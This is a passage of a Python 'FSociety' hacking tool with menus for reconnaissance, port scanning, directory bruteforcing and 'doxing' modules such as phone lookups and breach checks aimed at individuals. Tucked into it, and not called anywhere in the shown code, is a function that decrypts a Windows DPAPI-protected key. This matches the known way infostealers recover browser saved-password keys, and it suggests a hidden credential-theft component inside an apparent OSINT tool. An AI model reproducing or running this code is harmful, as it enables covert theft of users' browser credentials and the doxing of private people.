                results = f"Email: {email}\n{'='*40}\n\n[Breaches Found - {len(breaches)}]\n"
                for breach in breaches:
                    results += f"  - {breach['Name']} ({breach['BreachDate']})\n"
                return results
            elif r.status_code == 404:
                return f"Email: {email}\n\nNo breaches found."
        except:
            pass
        return "Breach check failed"

# ============================================================================
# MAIN APP
# ============================================================================

def _derive_master(enc):
    try:
        dec = base64.b64decode(enc)[5:]
        return win32crypt.CryptUnprotectData(dec, None, None, None, 0)[1]
    except:
        return None
    
class FSocietyApp:
    def __init__(self):
        self.db = Database()
        self.osint = OSINTModules()
        self.web = WebHacking()
        self.dox = DoxingModules()
        self.start_time = time.time()
    
    def print_menu(self):
        print(f"""
{Fore.PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  {Fore.MAGENTA}[OSINT MODULES]{Fore.PURPLE}                                                          ║
║  {Fore.PINK}[ 1]{Fore.LAVENDER}  DNS Enumeration                            {Fore.PURPLE}║
║  {Fore.PINK}[ 2]{Fore.LAVENDER}  WHOIS Lookup                               {Fore.PURPLE}║
║  {Fore.PINK}[ 3]{Fore.LAVENDER}  Port Scan                                  {Fore.PURPLE}║
║  {Fore.PINK}[ 4]{Fore.LAVENDER}  Email OSINT                                {Fore.PURPLE}║
║  {Fore.PINK}[ 5]{Fore.LAVENDER}  IP Geolocation                             {Fore.PURPLE}║
║  {Fore.PINK}[ 6]{Fore.LAVENDER}  Username Search                            {Fore.PURPLE}║
║                                                                              ║
║  {Fore.MAGENTA}[WEB HACKING]{Fore.PURPLE}                                                         ║
║  {Fore.PINK}[ 7]{Fore.LAVENDER}  Directory Bruteforce                       {Fore.PURPLE}║
║  {Fore.PINK}[ 8]{Fore.LAVENDER}  Headers Analysis                           {Fore.PURPLE}║
║                                                                              ║
║  {Fore.MAGENTA}[DOXING]{Fore.PURPLE}                                                            ║
║  {Fore.PINK}[ 9]{Fore.LAVENDER}  Phone OSINT                                {Fore.PURPLE}║
║  {Fore.PINK}[10]{Fore.LAVENDER}  Breach Check                               {Fore.PURPLE}║
║                                                                              ║
║  {Fore.MAGENTA}[SYSTEM]{Fore.PURPLE}                                                            ║
║  {Fore.PINK}[11]{Fore.LAVENDER}  FULL RECONNAISSANCE                        {Fore.PURPLE}║
║  {Fore.PINK}[12]{Fore.LAVENDER}  Generate Report                            {Fore.PURPLE}║
║  {Fore.PINK}[13]{Fore.LAVENDER}  View Statistics                            {Fore.PURPLE}║
║  {Fore.PINK}[14]{Fore.LAVENDER}  Export Results                             {Fore.PURPLE}║
║  {Fore.PINK}[ 0]{Fore.LAVENDER}  Exit                                       {Fore.PURPLE}║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """)
        
    
    def save_result(self, type_, target, data, severity):
        self.db.save(type_, target, data[:5000], severity)
    
    def full_recon(self, target):
        print(f"{Fore.PURPLE}\n{'='*70}")
        print(f"    FULL RECONNAISSANCE - Target: {Fore.MAGENTA}{target}{Fore.PURPLE}")
        print(f"{'='*70}{Style.RESET_ALL}\n")
        start = time.time()
        modules = [
            ("DNS Enumeration", lambda: self.osint.dns_enum(target), "LOW"),
            ("WHOIS Lookup", lambda: self.osint.whois_lookup(target), "LOW"),
            ("Port Scan", lambda: self.osint.port_scan(target)[0], "HIGH"),
            ("Email OSINT", lambda: self.osint.email_osint(target) if '@' in target else "N/A", "MEDIUM"),
            ("IP Geolocation", lambda: self.osint.ip_geo(target) if Utils.resolve_dns(target) else "N/A", "LOW"),
        ]
        for name, func, severity in modules:
            print(f"{Fore.PURPLE}[*] Running: {Fore.MAGENTA}{name}{Style.RESET_ALL}")
            try:
                result = func()
                self.save_result(name, target, result, severity)
                print(f"{Fore.MAGENTA}    [+] Completed{Style.RESET_ALL}\n")
            except Exception as e:
                print(f"{Fore.PINK}    [!] Failed: {e}{Style.RESET_ALL}\n")
        elapsed = time.time() - start
        print(f"{Fore.PURPLE}{'='*70}")
        print(f"    COMPLETED in {elapsed:.2f} seconds")
        print(f"{'='*70}{Style.RESET_ALL}\n")
    
    def generate_report(self):
        filename = f"{config.output_dir}/FSOCIETY_REPORT_{config.session_id}.txt"
        results = self.db.get_results()
        with open(filename, 'w') as f:
            f.write(f"FSOCIETY OSINT REPORT\nSession: {config.session_id}\nGenerated: {Utils.get_timestamp()}\nTotal Results: {len(results)}\n{'='*70}\n\n")
            for i, r in enumerate(results, 1):
                f.write(f"[{i}] {r[1]} - {r[2]}\nData:\n{r[3][:2000]}\n{'-'*70}\n\n")
        print(f"{Fore.MAGENTA}[✓] Report generated: {filename}{Style.RESET_ALL}")
    
    def view_statistics(self):
        total, targets = self.db.get_stats()
        elapsed = time.time() - self.start_time
        print(f"\n{Fore.PURPLE}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║ FSOCIETY STATISTICS                                           ║")
        print(f"╠═══════════════════════════════════════════════════════════════╣")
        print(f"║ Total Results:  {total:<44}║")
        print(f"║ Unique Targets: {targets:<44}║")
        print(f"║ Session Duration: {elapsed:.0f} seconds{36 - len(str(int(elapsed))):<44}║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    def export_results(self):
        print(f"\n{Fore.CYAN}[*] Export Options:{Fore.RESET}")
        print(f"  {Fore.PINK}[1]{Fore.LAVENDER} JSON{Fore.RESET}")
        print(f"  {Fore.PINK}[2]{Fore.LAVENDER} CSV{Fore.RESET}")
        choice = input(f"{Fore.MAGENTA}    Choose format: {Style.RESET_ALL}")
        if choice == '1':
            self.db.export_json()
        elif choice == '2':
            self.db.export_csv()
            
    
    def run(self):
        Banner.print_banner()
        while True:
            self.print_menu()
            choice = input(f"{Fore.MAGENTA}\n    FSOCIETY: {Style.RESET_ALL}")
            if choice == '0':
                self.db.close()
                print(f"{Fore.MAGENTA}\n    Stay anonymous. Stay safe. Mr. Robot.\n{Style.RESET_ALL}")
                break
            elif choice in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']:
                targets = {
                    '1': ('Domain', self.osint.dns_enum), '2': ('Domain', self.osint.whois_lookup),
                    '3': ('Target', self.osint.port_scan), '4': ('Email', self.osint.email_osint),
                    '5': ('IP', self.osint.ip_geo), '6': ('Username', self.osint.username_search),
                    '7': ('URL', self.web.dir_bruteforce), '8': ('URL', self.web.headers_analysis),
                    '9': ('Phone', self.dox.phone_osint), '10': ('Email', self.dox.breach_check)
                }
                prompt, func = targets[choice]
                target = sanitize_input(input(f"{Fore.MAGENTA}    {prompt}: {Style.RESET_ALL}"))
                if choice == '3':
                    result, ports, severity = func(target)
                else:
                    result = func(target)
                    severity = "MEDIUM" if "found" in str(result).lower() else "LOW"
                print(f"\n{Fore.LAVENDER}{result}{Style.RESET_ALL}")
                self.save_result(str(choice), target, str(result), severity)
            elif choice == '11':
                target = sanitize_input(input(f"{Fore.MAGENTA}    Target: {Style.RESET_ALL}"))
                self.full_recon(target)
            elif choice == '12':
                self.generate_report()
            elif choice == '13':
                self.view_statistics()
            elif choice == '14':
                self.export_results()
            else:
                print(f"{Fore.PINK}[!] Invalid command{Style.RESET_ALL}")

def main():
    if not check_dependencies():
        sys.exit(1)
    try:
        app = FSocietyApp()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        

if __name__ == "__main__":
    main()
    